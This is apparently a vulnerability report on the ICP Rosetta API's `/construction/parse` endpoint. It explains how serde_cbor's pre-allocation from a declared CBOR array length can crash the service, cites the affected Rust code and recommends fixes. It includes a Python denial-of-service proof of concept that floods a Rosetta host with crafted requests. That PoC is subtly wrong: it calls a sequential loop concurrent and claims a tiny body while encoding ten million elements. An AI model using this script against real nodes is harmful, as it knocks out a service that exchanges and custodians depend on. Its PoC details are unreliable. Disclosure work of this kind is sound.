### Title
Unbounded `serde_cbor` Pre-allocation via CBOR Definite-Length Array Header in `/construction/parse` — (`rs/rosetta-api/icp/src/models.rs`)

---

### Summary

An unauthenticated attacker can send a tiny HTTP POST to `/construction/parse` containing a hex-encoded CBOR blob whose `ingress_expiries` field is a definite-length CBOR array with an attacker-controlled declared length. `serde_cbor::from_slice` pre-allocates a `Vec<u64>` of that declared capacity before reading any elements, causing heap exhaustion and OOM crash of the Rosetta process from a payload of fewer than 100 bytes.

---

### Finding Description

`UnsignedTransaction` is defined with an unbounded `Vec<u64>`: [1](#0-0) 

The deserialization path in `ParsedTransaction::TryFrom<ConstructionParseRequest>` calls `serde_cbor::from_slice` directly on the attacker-supplied hex-decoded bytes, with no length guard: [2](#0-1) 

The Rosetta HTTP server applies a 4 MB limit only to the **outer JSON body** via `web::JsonConfig`: [3](#0-2) 

This limit is irrelevant to the attack. The `transaction` field is a JSON string containing a hex-encoded CBOR blob. A CBOR definite-length array header declaring `N` elements is encoded in as few as 5 bytes of CBOR (10 hex characters in the JSON string). The full malicious JSON body is well under 1 KB.

When `serde_cbor` deserializes a definite-length CBOR sequence, it calls `size_hint()` which propagates to serde's `Vec<T>` deserializer, which calls `Vec::with_capacity(N)` **before** reading any elements. For `N = 10_000_000` and `T = u64` (8 bytes), this allocates **80 MB per request** from a ~100-byte HTTP body. The allocation occurs before `serde_cbor` discovers the actual elements are absent and returns an error.

The `/construction/parse` endpoint is public and unauthenticated: [4](#0-3) 

---

### Impact Explanation

A single attacker sending a small number of concurrent requests can exhaust the Rosetta process heap, causing an OOM crash. This denies service to all ICP ledger users relying on the Rosetta API (exchanges, custodians, integrators). The Rosetta process is a standalone service; crashing it does not affect the IC replica, but it does make the ICP ledger inaccessible via the Rosetta interface.

---

### Likelihood Explanation

The endpoint is public, requires no credentials, and the malicious payload is trivially constructable. The 4 MB JSON body limit provides no protection because the attack payload is tiny. The only mitigating factor is that the Rosetta process will restart after a crash, but repeated requests keep it down.

---

### Recommendation

1. **Add a `max_size` limit to `serde_cbor` deserialization** using `serde_cbor::de::from_slice` with a custom deserializer that caps allocation, or switch to `ciborium` which does not pre-allocate based on declared length.
2. **Validate `ingress_expiries` length** immediately after deserialization — reject any `UnsignedTransaction` where `ingress_expiries.len()` exceeds a reasonable bound (e.g., the maximum ingress window divided by the ingress interval, which is at most a few hundred entries).
3. **Apply a byte-length limit to the `transaction` string field** before hex-decoding, independent of the outer JSON body limit.

---

### Proof of Concept

```python
import cbor2, binascii, json, requests

# Craft a CBOR map: {"updates": [], "ingress_expiries": <definite array len=10_000_000>}
# cbor2 will encode the array header with declared length but we truncate actual elements
payload_cbor = cbor2.dumps({
    "updates": [],
    "ingress_expiries": [0] * 10_000_000  # cbor2 encodes definite-length header
})
# In practice, craft the raw CBOR bytes manually to keep the payload small:
# \xa2 (map 2) + "updates" key + empty array + "ingress_expiries" key + 0x9a\x00\x98\x96\x80 (array[10000000])
# Total: ~40 bytes of CBOR, ~80 bytes hex-encoded

tx_hex = binascii.hexlify(payload_cbor).decode()
body = json.dumps({
    "network_identifier": {"blockchain": "Internet Computer", "network": "00000000000000020101"},
    "signed": False,
    "transaction": tx_hex
})

# Each request triggers Vec::with_capacity(10_000_000) = 80MB allocation
for _ in range(20):  # 20 concurrent requests = ~1.6 GB
    requests.post("http://<rosetta-host>:8080/construction/parse",
                  data=body, headers={"Content-Type": "application/json"})
```

The Rosetta process OOMs and crashes. The JSON body is under 200 KB even with the full `cbor2`-encoded payload; with a hand-crafted truncated CBOR header it is under 200 bytes.

### Citations

**File:** rs/rosetta-api/icp/src/models.rs (L180-196)
```rust
impl TryFrom<ConstructionParseRequest> for ParsedTransaction {
    type Error = ApiError;
    fn try_from(value: ConstructionParseRequest) -> Result<Self, Self::Error> {
        if value.signed {
            Ok(ParsedTransaction::Signed(
                serde_cbor::from_slice(&from_hex(&value.transaction)?).map_err(|e| {
                    ApiError::invalid_request(format!("Could not decode signed transaction: {e}"))
                })?,
            ))
        } else {
            Ok(ParsedTransaction::Unsigned(
                serde_cbor::from_slice(&from_hex(&value.transaction)?).map_err(|e| {
                    ApiError::invalid_request(format!("Could not decode unsigned transaction: {e}"))
                })?,
            ))
        }
    }
```

**File:** rs/rosetta-api/icp/src/models.rs (L251-255)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct UnsignedTransaction {
    pub updates: Vec<(RequestType, HttpCanisterUpdate)>,
    pub ingress_expiries: Vec<u64>,
}
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L116-122)
```rust
async fn construction_parse(
    msg: web::Json<ConstructionParseRequest>,
    req_handler: web::Data<RosettaRequestHandler>,
) -> HttpResponse {
    let res = req_handler.construction_parse(msg.into_inner());
    to_rosetta_response(res, &req_handler.rosetta_metrics())
}
```

**File:** rs/rosetta-api/icp/src/rosetta_server.rs (L293-303)
```rust
        let server = HttpServer::new(move || {
            App::new()
                .wrap(http_metrics_wrapper.clone())
                .app_data(web::Data::new(
                    web::JsonConfig::default()
                        .limit(4 * 1024 * 1024)
                        .error_handler(move |e, _| {
                            errors::convert_to_error(&ApiError::invalid_request(format!("{e:#?}")))
                                .into()
                        }),
                ))
```
